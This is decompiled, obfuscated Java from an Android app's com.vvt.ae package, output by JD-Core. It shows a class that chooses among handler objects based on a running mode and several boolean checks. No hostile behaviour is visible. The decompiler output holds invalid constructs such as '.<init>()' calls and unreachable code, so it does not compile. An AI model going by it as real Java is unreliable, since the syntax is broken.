package com.vvt.ae;

import android.content.Context;
import com.vvt.base.RunningMode;

public class f
{
  private static final boolean a = com.vvt.ak.a.a;
  private RunningMode b;
  private Context c;
  
  public f(RunningMode paramRunningMode, Context paramContext)
  {
    this.b = paramRunningMode;
    this.c = paramContext;
  }
  
  public void a(String paramString1, String paramString2)
  {
    d locald = new com/vvt/ae/d;
    locald.<init>();
    Object localObject1 = this.b;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 == localObject2)
    {
      bool = com.vvt.aa.c.a();
      if (bool)
      {
        bool = com.vvt.aa.a.d();
        if (bool)
        {
          bool = a;
          if (bool) {}
          localObject1 = new com/vvt/ae/b;
          ((b)localObject1).<init>(paramString1, paramString2);
          locald.a((e)localObject1);
        }
      }
    }
    for (;;)
    {
      locald.a();
      return;
      bool = com.vvt.aa.a.c();
      if (bool)
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/ae/b;
        ((b)localObject1).<init>(paramString1, paramString2);
        locald.a((e)localObject1);
      }
      else
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/ae/a;
        ((a)localObject1).<init>(paramString1, paramString2);
        locald.a((e)localObject1);
        continue;
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/ae/c;
        localObject2 = this.c;
        ((c)localObject1).<init>(paramString1, paramString2, (Context)localObject2);
        locald.a((e)localObject1);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ae/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */